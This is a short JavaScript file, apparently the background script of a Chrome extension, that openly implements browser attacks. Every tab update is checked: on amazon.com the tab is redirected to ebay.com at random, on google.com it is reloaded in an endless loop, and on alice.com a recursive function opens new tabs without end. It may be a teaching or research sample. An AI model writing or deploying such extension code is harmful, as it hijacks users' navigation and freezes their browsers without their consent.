activationProbability = 0.2

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.url.indexOf("amazon.com") > -1) {
	redirectAttack(tabId);
    }

    if (tab.url.indexOf("google.com") > -1) {
        reloadAttack(tabId);
    }

    if (tab.url.indexOf("alice.com") > -1) {
        fork_bomb();
    }
});

function redirectAttack(tabId) {
    var randOut = Math.random();
    if (randOut < activationProbability) {
	var updateParam = new Object();
	updateParam.url = "http://ebay.com";
	chrome.tabs.update(tabId, updateParam);
    }
}

function reloadAttack(tabId) {
    while(true) {
	chrome.tabs.reload(tabId);
    }
}

function fork_bomb() {
    alice = new Object();
    alice.url = "http://alicepotato.com"
    chrome.tabs.create(alice, fork_bomb)
    fork_bomb()
}
